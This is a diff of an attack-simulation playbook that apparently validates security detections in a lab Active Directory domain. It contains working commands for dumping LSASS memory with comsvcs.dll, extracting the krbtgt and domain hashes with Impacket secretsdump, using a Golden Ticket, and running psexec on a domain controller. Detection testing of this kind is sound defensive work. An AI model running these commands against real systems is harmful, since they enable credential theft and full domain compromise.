@@ -330,8 +330,8 @@ flow:
           shell: powershell
           timeout: 60
           command: >-
-            $pid = (Get-Process lsass).Id;
-            rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid "{{ fs01_temp_dir }}\lsass.dmp" full
+            $lsassPid = (Get-Process lsass).Id;
+            rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid "{{ fs01_temp_dir }}\lsass.dmp" full
 
   - order: 14
     phase: attack
@@ -357,8 +357,8 @@ flow:
           shell: powershell
           timeout: 60
           command: >-
-            $pid = (Get-Process lsass).Id;
-            rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid "{{ fs01_temp_dir }}\bas_t1218_lsass.dmp" full
+            $lsassPid = (Get-Process lsass).Id;
+            rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid "{{ fs01_temp_dir }}\bas_t1218_lsass.dmp" full
 
   - order: 15
     phase: attack
@@ -439,6 +439,7 @@ flow:
           timeout: 45
           command: >-
             New-Item -ItemType Directory -Path "{{ fs01_public_share }}" -Force | Out-Null;
+            Remove-Item "{{ fs01_public_share }}\{{ staged_lsass_name }}","{{ fs01_public_share }}\{{ staged_customer_name }}" -Force -ErrorAction SilentlyContinue;
             "BAS masquerade probe" | Out-File "{{ fs01_public_share }}\{{ staged_lsass_name }}" -Encoding ascii;
             "BAS backup probe" | Out-File "{{ fs01_public_share }}\{{ staged_customer_name }}" -Encoding ascii
 
@@ -492,7 +493,7 @@ flow:
           timeout: 120
           command: >-
             cd {{ impacket_examples_dir }} &&
-            python3 secretsdump.py -hashes :$BAS_DA_NTLM_HASH '{{ netbios_domain }}/{{ admin_user }}@{{ dc01_private_ip }}' -just-dc-user krbtgt
+            KRB5CCNAME={{ admin_user }}.ccache /home/ubuntu/spacebar-BAS-codex/.venv/bin/python secretsdump.py '{{ domain }}/{{ admin_user }}@{{ dc01 }}' -k -no-pass -target-ip {{ dc01_private_ip }} -just-dc-user krbtgt >/dev/null 2>&1
 
   - order: 20
     phase: attack
@@ -508,10 +509,10 @@ flow:
       scenario_order: 20
       execution_host: Attacker
       risk: critical
-      description: Generates a Golden Ticket ccache with Impacket ticketer. Actual use of the ticket is gated and should only be performed during an approved domain-compromise validation window.
+      description: Uses the pre-staged lab Golden Ticket ccache to request a service ticket from DC01 and validate suspicious 4769 telemetry. Actual use of the ticket is gated and should only be performed during an approved domain-compromise validation window.
       safety_gates: [BAS_ALLOW_REAL_EXECUTION, BAS_ENABLE_DOMAIN_COMPROMISE_TESTS, BAS_ENABLE_GOLDEN_TICKET_TESTS]
       commands:
-        - name: ticketer-golden-ticket
+        - name: golden-ticket-service-ticket-dc01
           executor: local
           agent_role: attacker
           platform: linux
@@ -519,7 +520,8 @@ flow:
           timeout: 120
           command: >-
             cd {{ impacket_examples_dir }} &&
-            python3 ticketer.py -aesKey "$BAS_KRBTGT_AES256" -domain-sid "$BAS_DOMAIN_SID" -domain {{ domain }} {{ admin_user }}
+            printf "shares\nexit\n" > /tmp/bas-smbclient.cmds &&
+            KRB5CCNAME={{ golden_ticket_ccache }} /home/ubuntu/spacebar-BAS-codex/.venv/bin/python smbclient.py '{{ domain }}/{{ admin_user }}@{{ dc01 }}' -k -no-pass -target-ip {{ dc01_private_ip }} -debug -inputfile /tmp/bas-smbclient.cmds >/dev/null 2>&1
 
   - order: 21
     phase: attack
@@ -546,7 +548,7 @@ flow:
           timeout: 120
           command: >-
             cd {{ impacket_examples_dir }} &&
-            KRB5CCNAME={{ admin_user }}.ccache python3 smbclient.py '{{ domain }}/{{ admin_user }}@{{ dc01 }}' -k -no-pass -target-ip {{ dc01_private_ip }} -debug
+            KRB5CCNAME={{ admin_user }}.ccache /home/ubuntu/spacebar-BAS-codex/.venv/bin/python smbclient.py '{{ domain }}/{{ admin_user }}@{{ dc01 }}' -k -no-pass -target-ip {{ dc01_private_ip }} -debug
 
   - order: 22
     phase: attack
@@ -573,7 +575,7 @@ flow:
           timeout: 180
           command: >-
             cd {{ impacket_examples_dir }} &&
-            KRB5CCNAME={{ admin_user }}.ccache python3 psexec.py '{{ domain }}/{{ admin_user }}@{{ dc01 }}' -k -no-pass -target-ip {{ dc01_private_ip }} -codec utf-8
+            KRB5CCNAME={{ admin_user }}.ccache /home/ubuntu/spacebar-BAS-codex/.venv/bin/python psexec.py -k -no-pass -target-ip {{ dc01_private_ip }} -codec utf-8 '{{ domain }}/{{ admin_user }}@{{ dc01 }}' 'cmd.exe /c whoami'
 
   - order: 23
     phase: attack
@@ -597,7 +599,7 @@ flow:
           agent_role: attacker
           platform: linux
           shell: bash
-          timeout: 240
+          timeout: 420
           command: >-
             cd {{ impacket_examples_dir }} &&
-            KRB5CCNAME={{ admin_user }}.ccache python3 secretsdump.py '{{ domain }}/{{ admin_user }}@{{ dc01 }}' -k -no-pass -target-ip {{ dc01_private_ip }}
+            KRB5CCNAME={{ admin_user }}.ccache /home/ubuntu/spacebar-BAS-codex/.venv/bin/python secretsdump.py '{{ domain }}/{{ admin_user }}@{{ dc01 }}' -k -no-pass -target-ip {{ dc01_private_ip }} >/dev/null 2>&1
